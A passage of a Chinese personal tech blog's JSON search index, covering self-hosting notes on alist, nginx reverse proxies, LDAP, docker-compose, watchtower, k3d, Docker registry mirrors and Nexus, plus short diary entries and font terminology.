\"/etc/alist:/opt/alist/data\" - \"/opt/alist/data/temp/aria2:/opt/alist/data/temp/aria2\" ports: - \"5244:5244\" environment: - PUID=0 - PGID=0 - UMASK=022 container_name: alist image: \"xhofe/alist-aria2:latest\" ","date":"2023-08-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/alist/:1:1","series":null,"tags":["point","未命名"],"title":"alist","uri":"/posts/%E7%AC%94%E8%AE%B0/point/alist/#服务启动"},{"categories":["point"],"content":" 反向代理nginx 代理配置 server { listen 80; server_name alist.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/alist.kentxxq.com.log k-json; } server { listen 443 ssl; server_name alist.kentxxq.com; client_max_body_size 204800M; ssl_certificate /usr/local/nginx/conf/ssl/kentxxq.cer; ssl_certificate_key /usr/local/nginx/conf/ssl/kentxxq.key; access_log /usr/local/nginx/conf/hosts/logs/alist.kentxxq.com.log k-json; location / { proxy_pass http://10.0.1.157:5244; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Range $http_range; proxy_set_header If-Range $http_if_range; proxy_redirect off; } } ","date":"2023-08-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/alist/:1:2","series":null,"tags":["point","未命名"],"title":"alist","uri":"/posts/%E7%AC%94%E8%AE%B0/point/alist/#反向代理"},{"categories":["point"],"content":" 使用","date":"2023-08-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/alist/:2:0","series":null,"tags":["point","未命名"],"title":"alist","uri":"/posts/%E7%AC%94%E8%AE%B0/point/alist/#使用"},{"categories":["point"],"content":" Webdav 小米电视 安装当贝市场 在当贝市场安装 KODI (自己搜索的版本没有声音,, 但是当贝市场的没问题) 添加源 设置=\u003e文件管理=\u003e添加网络位置 ","date":"2023-08-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/alist/:2:1","series":null,"tags":["point","未命名"],"title":"alist","uri":"/posts/%E7%AC%94%E8%AE%B0/point/alist/#webdav"},{"categories":["point"],"content":" Webdav 小米电视 安装当贝市场 在当贝市场安装 KODI (自己搜索的版本没有声音,, 但是当贝市场的没问题) 添加源 设置=\u003e文件管理=\u003e添加网络位置 ","date":"2023-08-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/alist/:2:1","series":null,"tags":["point","未命名"],"title":"alist","uri":"/posts/%E7%AC%94%E8%AE%B0/point/alist/#小米电视"},{"categories":["point"],"content":" 离线下载 离线下载支持磁力链接, 例如 magnet:?xt=urn:btih:EF7CE211B79187E4D8DDEB906095027534607EA6\u0026dn=American%20Prometheus%3A%20The%20Triumph%20and%20Tragedy%20of%20J.R.%20Oppenheimer\u0026tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969%2Fannounce\u0026tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A6969%2Fannounce\u0026tr=udp%3A%2F%2Ftracker.bittor.pw%3A1337%2Fannounce\u0026tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337\u0026tr=udp%3A%2F%2Fbt.xxx-tracker.com%3A2710%2Fannounce\u0026tr=udp%3A%2F%2Fpublic.popcorn-tracker.org%3A6969%2Fannounce\u0026tr=udp%3A%2F%2Feddie4.nl%3A6969%2Fannounce\u0026tr=udp%3A%2F%2Ftracker.torrent.eu.org%3A451%2Fannounce\u0026tr=udp%3A%2F%2Fp4p.arenabg.com%3A1337%2Fannounce\u0026tr=udp%3A%2F%2Ftracker.tiny-vps.com%3A6969%2Fannounce\u0026tr=udp%3A%2F%2Fopen.stealth.si%3A80%2Fannounce ","date":"2023-08-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/alist/:2:2","series":null,"tags":["point","未命名"],"title":"alist","uri":"/posts/%E7%AC%94%E8%AE%B0/point/alist/#离线下载"},{"categories":["point"],"content":"ldap 是一个目录访问协议. 通过树状目录结构, 对人员/资源进行分类, 权限管理. 要点: 很多工具都对接了. 例如 gitlab, jenkins ","date":"2023-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/ldap/:0:0","series":null,"tags":["point","LDAP"],"title":"ldap","uri":"/posts/%E7%AC%94%E8%AE%B0/point/ldap/#"},{"categories":["point"],"content":" 相关资源 phpLDAPadmin 是一个 web-ui 工具: docker run --rm -p 6443:443 --env PHPLDAPADMIN_LDAP_HOSTS=localhost -d osixia/phpldapadmin:latest osixia/openldap 可以用于快速搭建一个 ldap 服务. docker run --rm --hostname ldap.kentxxq.com -p 389:389 -p 636:636 --name myopenldap --env LDAP_DOMAIN=\"ldap.kentxxq.com\" --env LDAP_ADMIN_PASSWORD=\"密码\" --env LDAP_TLS_VERIFY_CLIENT=try osixia/openldap:latest ldapsearch 可以用来 debug. ldapsearch -x -H ldaps://ldap.kentxxq.com -b dc=ldap,dc=kentxxq,dc=com -D \"cn=admin,dc=ldap,dc=kentxxq,dc=com\" -w \"密码\" ","date":"2023-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/ldap/:1:0","series":null,"tags":["point","LDAP"],"title":"ldap","uri":"/posts/%E7%AC%94%E8%AE%B0/point/ldap/#相关资源"},{"categories":["blog"],"content":" 简介这里记录 vscode 的配置和技巧. ","date":"2023-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/vscode%E6%8A%80%E5%B7%A7/:1:0","series":null,"tags":["blog","vscode"],"title":"vscode技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/vscode%E6%8A%80%E5%B7%A7/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/vscode%E6%8A%80%E5%B7%A7/:2:0","series":null,"tags":["blog","vscode"],"title":"vscode技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/vscode%E6%8A%80%E5%B7%A7/#内容"},{"categories":["blog"],"content":" 格式化因为安装了 Prettier 保存时自动格式化代码. 不格式化保存: F1=\u003eformat=\u003e不格式化保存 ","date":"2023-08-30","objectID":"/posts/%E7%AC%94%E8%AE%B0/vscode%E6%8A%80%E5%B7%A7/:2:1","series":null,"tags":["blog","vscode"],"title":"vscode技巧","uri":"/posts/%E7%AC%94%E8%AE%B0/vscode%E6%8A%80%E5%B7%A7/#格式化"},{"categories":["blog"],"content":"[[笔记/point/docker|docker]] 的 `docker-compose`.独立于 [[笔记/docker教程|docker教程]], 方便查找和使用.","date":"2023-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker-compose%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","docker"],"title":"docker-compose教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker-compose%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介docker 的 docker-compose.独立于 docker教程, 方便查找和使用. ","date":"2023-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker-compose%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","docker"],"title":"docker-compose教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker-compose%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 配置解析 version: \"3\" services: container_name: web # 构建相关 build: context: web-directory dockerfile: web-directory/Dockerfile # 依赖与db服务 depends_on: - db web: image: kentxxq/web:1 restart: always env_file: # 文件内容类似 CORECLR_ENABLE_PROFILING=\"1\" - xxx.env environment: A: a volumes: # 盘挂载 - ./data:/var/lib/gitea # 只读挂载 - /etc/localtime:/etc/localtime:ro ports: # web端口 - \"3000:3000\" db: image: ... ... ","date":"2023-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker-compose%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","docker"],"title":"docker-compose教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker-compose%E6%95%99%E7%A8%8B/#配置解析"},{"categories":["blog"],"content":" 操作 docker-compose虽然在生产环境 docker-compose 很少用到, 但是在开发, 测试, poc 的时候经常会用到. docker-compose 现在集成到了 docker 里, 所以 docker-compose 和 docker compose 等效 # 只拉取镜像 docker compose -f xxxx.yml pull # -d表示后台启动 --build表示构建镜像 docker compose up -d --build # 停止 docker compose down --remove-orphans # 重建容器 docker compose up -d --force-recreate ","date":"2023-08-29","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker-compose%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","docker"],"title":"docker-compose教程","uri":"/posts/%E7%AC%94%E8%AE%B0/docker-compose%E6%95%99%E7%A8%8B/#操作-docker-compose"},{"categories":["journal"],"content":"2023-08-28 日记","date":"2023-08-28","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-28/","series":null,"tags":["journal"],"title":"2023-08-28","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-28/"},{"categories":["journal"],"content":"#fun 乔布斯的人生记录 The Steve Jobs Archive ","date":"2023-08-28","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-28/:0:0","series":null,"tags":["journal"],"title":"2023-08-28","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-28/#"},{"categories":["point"],"content":"内容多起来, 如果没有及时整理, 就会发现有很多的标签. 这里做一下分类和说明 #lines: 自己的语句 #fun: 有趣的内容, 或者说无聊时可以发散一下思维的内容 #todo: 待办的事项, 确定应该做. 会帮助到自己 ","date":"2023-08-28","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E6%A0%87%E7%AD%BE%E5%90%AB%E4%B9%89/:0:0","series":null,"tags":["point","标签含义"],"title":"标签含义","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E6%A0%87%E7%AD%BE%E5%90%AB%E4%B9%89/#"},{"categories":["point"],"content":"watchtower 是一个 docker 容器过期, 自动更新的程序. ","date":"2023-08-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/watchtower/:0:0","series":null,"tags":["point","watchtower"],"title":"watchtower","uri":"/posts/%E7%AC%94%E8%AE%B0/point/watchtower/#"},{"categories":["point"],"content":" 部署 version: \"3\" services: watchtower: image: containrrr/watchtower environment: # 清理过期镜像 --cleanup WATCHTOWER_CLEANUP: true # 开启debug日志 --debug, WATCHTOWER_TRACE 日志会更多 WATCHTOWER_DEBUG: true # 检测间隔时间 --interval, 86400/1天 3600/1小时 WATCHTOWER_POLL_INTERVAL: 3600 # token # WATCHTOWER_HTTP_API_TOKEN: token # 抓取metrics,需要用到token # WATCHTOWER_HTTP_API_METRICS: true # 远程主机 # DOCKER_HOST: \"tcp://10.0.1.2:2375\" # 运行后退出, 可以用crontab一次行运行 --run-once # WATCHTOWER_RUN_ONCE: true volumes: - /var/run/docker.sock:/var/run/docker.sock 定时任务crontab 使用 6 6 * * * root /usr/bin/docker run --rm --name watchtower -v /var/run/docker.sock:/var/run/docker.sock containrrr/watchtower --cleanup --run-once [特定容器,不填则全部容器] ","date":"2023-08-24","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/watchtower/:0:1","series":null,"tags":["point","watchtower"],"title":"watchtower","uri":"/posts/%E7%AC%94%E8%AE%B0/point/watchtower/#部署"},{"categories":["blog"],"content":" 简介这里记录 k3d 是使用和配置 ","date":"2023-08-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog"],"title":"k3d教程","uri":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog"],"title":"k3d教程","uri":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/#内容"},{"categories":["blog"],"content":" 安装到 Releases · k3d-io/k3d 下载对应的版本即可. curl -L https://github.com/k3d-io/k3d/releases/download/v5.6.0/k3d-linux-amd64 -o k3d chmod +x k3d mv k3d /usr/local/sbin/k3d ","date":"2023-08-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog"],"title":"k3d教程","uri":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 创建 registry为什么创建集群之前需要先创建 registry? 因为国内的网络问题. 创建 registry , 将请求代理到国内可以访问的地址. # k3d节点内可以通过 k3d-节点名 例如 k3d-docker.io.localhost:5000 连接 # -p 5000说明宿主机也是5000端口访问 k3d registry create docker.io.localhost -p 5000 --proxy-remote-url https://hub-mirror.c.163.com k3d registry create registry.k8s.io.localhost -p 5001 --proxy-remote-url https://k8s.dockerproxy.com k3d registry create ghcr.io.localhost -p 5002 --proxy-remote-url https://ghcr.dockerproxy.com k3d registry list ","date":"2023-08-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog"],"title":"k3d教程","uri":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/#创建-registry"},{"categories":["blog"],"content":" 使用集群 创建集群创建配置文件 vim k3d-default.yaml --- apiVersion: k3d.io/v1alpha5 kind: Simple metadata: name: k3s-default servers: 1 agents: 1 image: docker.io/rancher/k3s:v1.27.4-k3s1 kubeAPI: host: \"127.0.0.1\" # kubeconfig的server名字 hostIP: \"0.0.0.0\" # 接受所有的请求 hostPort: \"6445\" # api-server在宿主机的6445端口 ports: # same as `--port '80:80@loadbalancer'` # 通过loadbalancer映射80端口到宿主机 - port: 80:80 nodeFilters: - loadbalancer registries: # 这里的配置,让内部可以通过域名方式请求到registry use: - k3d-docker.io.localhost:5000 - k3d-registry.k8s.io.localhost:5001 # 这里配置你想要代理的源 config: | mirrors: docker.io: endpoint: - \"http://k3d-docker.io.localhost:5000\" registry.k8s.io: endpoint: - \"http://k3d-registry.k8s.io.localhost:5001\" options: k3s: extraArgs: # --k3s-arg的额外参数 # 证书里添加公网ip,这样就可以远程连接 - arg: \"--tls-san=1.2.3.4\" nodeFilters: - server:* # 禁用traefik,自己安装ingress-nginx - arg: \"--disable=traefik\" nodeFilters: - server:* 创建集群 k3d cluster create -c k3d-default.yaml 添加节点 # 添加节点到指定集群 k3d node create 节点名称 -c k3s-default 移除集群 k3d cluster delete ","date":"2023-08-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog"],"title":"k3d教程","uri":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/#使用集群"},{"categories":["blog"],"content":" 使用集群 创建集群创建配置文件 vim k3d-default.yaml --- apiVersion: k3d.io/v1alpha5 kind: Simple metadata: name: k3s-default servers: 1 agents: 1 image: docker.io/rancher/k3s:v1.27.4-k3s1 kubeAPI: host: \"127.0.0.1\" # kubeconfig的server名字 hostIP: \"0.0.0.0\" # 接受所有的请求 hostPort: \"6445\" # api-server在宿主机的6445端口 ports: # same as `--port '80:80@loadbalancer'` # 通过loadbalancer映射80端口到宿主机 - port: 80:80 nodeFilters: - loadbalancer registries: # 这里的配置,让内部可以通过域名方式请求到registry use: - k3d-docker.io.localhost:5000 - k3d-registry.k8s.io.localhost:5001 # 这里配置你想要代理的源 config: | mirrors: docker.io: endpoint: - \"http://k3d-docker.io.localhost:5000\" registry.k8s.io: endpoint: - \"http://k3d-registry.k8s.io.localhost:5001\" options: k3s: extraArgs: # --k3s-arg的额外参数 # 证书里添加公网ip,这样就可以远程连接 - arg: \"--tls-san=1.2.3.4\" nodeFilters: - server:* # 禁用traefik,自己安装ingress-nginx - arg: \"--disable=traefik\" nodeFilters: - server:* 创建集群 k3d cluster create -c k3d-default.yaml 添加节点 # 添加节点到指定集群 k3d node create 节点名称 -c k3s-default 移除集群 k3d cluster delete ","date":"2023-08-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog"],"title":"k3d教程","uri":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/#创建集群"},{"categories":["blog"],"content":" 使用集群 创建集群创建配置文件 vim k3d-default.yaml --- apiVersion: k3d.io/v1alpha5 kind: Simple metadata: name: k3s-default servers: 1 agents: 1 image: docker.io/rancher/k3s:v1.27.4-k3s1 kubeAPI: host: \"127.0.0.1\" # kubeconfig的server名字 hostIP: \"0.0.0.0\" # 接受所有的请求 hostPort: \"6445\" # api-server在宿主机的6445端口 ports: # same as `--port '80:80@loadbalancer'` # 通过loadbalancer映射80端口到宿主机 - port: 80:80 nodeFilters: - loadbalancer registries: # 这里的配置,让内部可以通过域名方式请求到registry use: - k3d-docker.io.localhost:5000 - k3d-registry.k8s.io.localhost:5001 # 这里配置你想要代理的源 config: | mirrors: docker.io: endpoint: - \"http://k3d-docker.io.localhost:5000\" registry.k8s.io: endpoint: - \"http://k3d-registry.k8s.io.localhost:5001\" options: k3s: extraArgs: # --k3s-arg的额外参数 # 证书里添加公网ip,这样就可以远程连接 - arg: \"--tls-san=1.2.3.4\" nodeFilters: - server:* # 禁用traefik,自己安装ingress-nginx - arg: \"--disable=traefik\" nodeFilters: - server:* 创建集群 k3d cluster create -c k3d-default.yaml 添加节点 # 添加节点到指定集群 k3d node create 节点名称 -c k3s-default 移除集群 k3d cluster delete ","date":"2023-08-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog"],"title":"k3d教程","uri":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/#添加节点"},{"categories":["blog"],"content":" 使用集群 创建集群创建配置文件 vim k3d-default.yaml --- apiVersion: k3d.io/v1alpha5 kind: Simple metadata: name: k3s-default servers: 1 agents: 1 image: docker.io/rancher/k3s:v1.27.4-k3s1 kubeAPI: host: \"127.0.0.1\" # kubeconfig的server名字 hostIP: \"0.0.0.0\" # 接受所有的请求 hostPort: \"6445\" # api-server在宿主机的6445端口 ports: # same as `--port '80:80@loadbalancer'` # 通过loadbalancer映射80端口到宿主机 - port: 80:80 nodeFilters: - loadbalancer registries: # 这里的配置,让内部可以通过域名方式请求到registry use: - k3d-docker.io.localhost:5000 - k3d-registry.k8s.io.localhost:5001 # 这里配置你想要代理的源 config: | mirrors: docker.io: endpoint: - \"http://k3d-docker.io.localhost:5000\" registry.k8s.io: endpoint: - \"http://k3d-registry.k8s.io.localhost:5001\" options: k3s: extraArgs: # --k3s-arg的额外参数 # 证书里添加公网ip,这样就可以远程连接 - arg: \"--tls-san=1.2.3.4\" nodeFilters: - server:* # 禁用traefik,自己安装ingress-nginx - arg: \"--disable=traefik\" nodeFilters: - server:* 创建集群 k3d cluster create -c k3d-default.yaml 添加节点 # 添加节点到指定集群 k3d node create 节点名称 -c k3s-default 移除集群 k3d cluster delete ","date":"2023-08-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog"],"title":"k3d教程","uri":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/#移除集群"},{"categories":["blog"],"content":" 相关参考安装Ingress k3d 相关链接: 完整配置示例 k3d的Registries使用文档 ","date":"2023-08-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog"],"title":"k3d教程","uri":"/posts/%E7%AC%94%E8%AE%B0/k3d%E6%95%99%E7%A8%8B/#相关参考"},{"categories":["journal"],"content":"2023-08-20 日记","date":"2023-08-20","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-20/","series":null,"tags":["journal"],"title":"2023-08-20","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-20/"},{"categories":["journal"],"content":"#lines 遇到过空调不制冷的情况, 因为冷冻液泄露的问题. 今天看 电丸科技AK 的 视频 也遇到了这样的问题, 看评论区说铜管是可以抽真空的. 大概要 15 分钟的时间. 买新空调或者维修的时候记得要这样做. ","date":"2023-08-20","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-20/:0:0","series":null,"tags":["journal"],"title":"2023-08-20","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-20/#"},{"categories":["blog"],"content":"为什么会有这篇文章, 是因为我总是会遇到 docker, Containerd, k8s, minikube 等等网络问题. 统一在这里进行测试解决, 并且做成可用的方案. 工作和学习中无限使用!","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/","series":null,"tags":["blog","k8s","docker"],"title":"docker镜像源","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/"},{"categories":["blog"],"content":" 简介为什么会有这篇文章, 是因为我总是会遇到 docker, Containerd, k8s, minikube 等等网络问题. 统一在这里进行测试解决, 并且做成可用的方案. 工作和学习中无限使用! ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/:1:0","series":null,"tags":["blog","k8s","docker"],"title":"docker镜像源","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/#简介"},{"categories":["blog"],"content":" 搭建 registry registry-demo: restart: always image: registry:2 ports: - 5000:5000 volumes: - /data/registry:/var/lib/registry #todo/笔记 !!!!!! 搭建多个站点的 registry Registery 全部走 clash 代理! 因为域名确认, 所以这里的 url 是能够确认的! Nginx 域名代理 Containerd, k 8 s, docker, minikube 统一都走 nginx 不同域名. 可以参考, 做个 k 3 d 的教程?! k8s 代理问题一站式解决 - 知乎 ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/:2:0","series":null,"tags":["blog","k8s","docker"],"title":"docker镜像源","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/#搭建-registry"},{"categories":["blog"],"content":" 公共镜像源配置示例 { \"registry-mirrors\": [ \"https://docker.m.daocloud.io\", \"https://dockerproxy.com\", \"https://docker.mirrors.sjtug.sjtu.edu.cn\", \"https://mirror.baidubce.com\", \"https://docker.nju.edu.cn\" ] } 提供者 地址 Docker 镜像代理 https://dockerproxy.com 百度云 https://mirror.baidubce.com 上海交大镜像站 https://docker.mirrors.sjtug.sjtu.edu.cn 南京大学镜像站 https://docker.nju.edu.cn DaoCloud https://docker.m.daocloud.io DaoCloud, dockerproxy, 南京大学镜像站 支持源站较多 其他 DaoCloud支持的镜像源列表 DaoCloud的二进制，helm加速 不要使用阿里云镜像源, 因为数据不同步! 参考链接: 国内的 Docker Hub 镜像加速器，由国内教育机构与各大云服务商提供的镜像加速服务 | Dockerized 实践 https://github.com/y0ngb1n/dockerized · GitHub ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/:3:0","series":null,"tags":["blog","k8s","docker"],"title":"docker镜像源","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/#公共镜像源"},{"categories":["blog"],"content":" 镜像下载流程 Docker 发送 image名称:tag 到 registry 请求 manifest.list 数据, registry 返回一个不同架构的列表 拿到 linux+amd64 的 image-digest, 请求服务器 manifest 数据 config.digest 就是你本地 docker images 中的 docker id. 如果本地存在就不会再拉取镜像 镜像不存在则继续查看是否有 layers 已经存在, 存在的就不会去下载 通过带上 layersDigest 请求 registry, 下载不存在的 layers ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/:4:0","series":null,"tags":["blog","k8s","docker"],"title":"docker镜像源","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/#镜像下载流程"},{"categories":["blog"],"content":" 验证镜像一致性这里拿 nginx:1.24 来举例. # 从网易源拉取镜像,提示repo-digest值 docker pull hub-mirror.c.163.com/library/nginx:1.24 Digest: sha256:a195f9fb6503531660b25f9aeefef1f48bbaf56f46da04bffe1568abb3d3aff6 # 请求镜像源 curl -v --location 'https://hub-mirror.c.163.com/v2/library/nginx/manifests/1.24' \\ --header 'Accept: application/vnd.docker.distribution.manifest.list.v2+json' # header中的Docker-Content-Digest与上面repo-digest一致 sha256:a195f9fb6503531660b25f9aeefef1f48bbaf56f46da04bffe1568abb3d3aff6 # 找到对应架构的image-digest,例如amd64,linux # digest: sha256:4a1d2e00b08fce95e140e272d9a0223d2d059142ca783bf43cf121d7c11c7df8 打开 DockerHub的站点,可以发现 image-digest 匹配. 而 image-digest 是镜像 manifest 的 sha256 的哈希值. 而 manifest 记录着镜像每一层的 layers 哈希值. 也就是说, 网易源和 dockerhub 的每一层 layers 完全一致. ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/:5:0","series":null,"tags":["blog","k8s","docker"],"title":"docker镜像源","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/#验证镜像一致性"},{"categories":["blog"],"content":" 镜像 tag 脚本 for i in 镜像名1 镜像名2 镜像名3 do docker pull $i docker tag $i 镜像源.com/xxx/$i docker push 镜像源.com/xxx/$i docker rmi $i done ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/:6:0","series":null,"tags":["blog","k8s","docker"],"title":"docker镜像源","uri":"/posts/%E7%AC%94%E8%AE%B0/docker%E9%95%9C%E5%83%8F%E6%BA%90/#镜像-tag-脚本"},{"categories":["point"],"content":"nexus 是一个包仓库管理工具. 可以存储 java, csharp, docker 等等包. 要点: 免费易用 用户量大 主流支持 ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nexus/:0:0","series":null,"tags":["point","nexus"],"title":"nexus","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nexus/#"},{"categories":["point"],"content":" 安装docker 启动 docker run -d --restart=always -p 8081:8081 --name nexus -v /data/nexus:/nexus-data sonatype/nexus3 nginx 配置 server { listen 80; server_name nexus.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/nexus.kentxxq.com k-json; } server { listen 443 ssl; server_name nexus.kentxxq.com; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; access_log /usr/local/nginx/conf/hosts/logs/nexus.kentxxq.com k-json; client_max_body_size 800M; location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto \"https\"; proxy_pass http://10.0.1.156:8081; } } ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nexus/:0:1","series":null,"tags":["point","nexus"],"title":"nexus","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nexus/#安装"},{"categories":["point"],"content":" 配置可以通过设置一个代理, 这样就可以分流直接拉取国内无法访问的内容. HTTP and HTTPS Request and Proxy Settings ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/nexus/:0:2","series":null,"tags":["point","nexus"],"title":"nexus","uri":"/posts/%E7%AC%94%E8%AE%B0/point/nexus/#配置"},{"categories":["blog"],"content":" 简介这里记录一下选择字体的时候学到的知识. ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/:1:0","series":null,"tags":["blog"],"title":"字体知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/:2:0","series":null,"tags":["blog"],"title":"字体知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/#内容"},{"categories":["blog"],"content":" 字体类型/字重常用: Regular: 常规 - 默认 Bold: 粗体 Light: 轻量/细 Italic: 斜体 拼接: Semi-Bold: 半宽粗体 Extra-Light: 特别轻量 Bold-Light: 粗斜体 ….. 任意拼接 ","date":"2023-08-18","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/:2:1","series":null,"tags":["blog"],"title":"字体知识","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%AD%97%E4%BD%93%E7%9F%A5%E8%AF%86/#字体类型字重"},{"categories":["blog"],"content":" 字体风格 风格 等宽 弯引号 破折号 连字 Gothic 否 全宽 全宽 否 UI 否 半宽 全宽 否 Mono 是 半宽 半宽 是 Term 是 半宽 半宽 是 Fixed 是 半宽 半宽 否 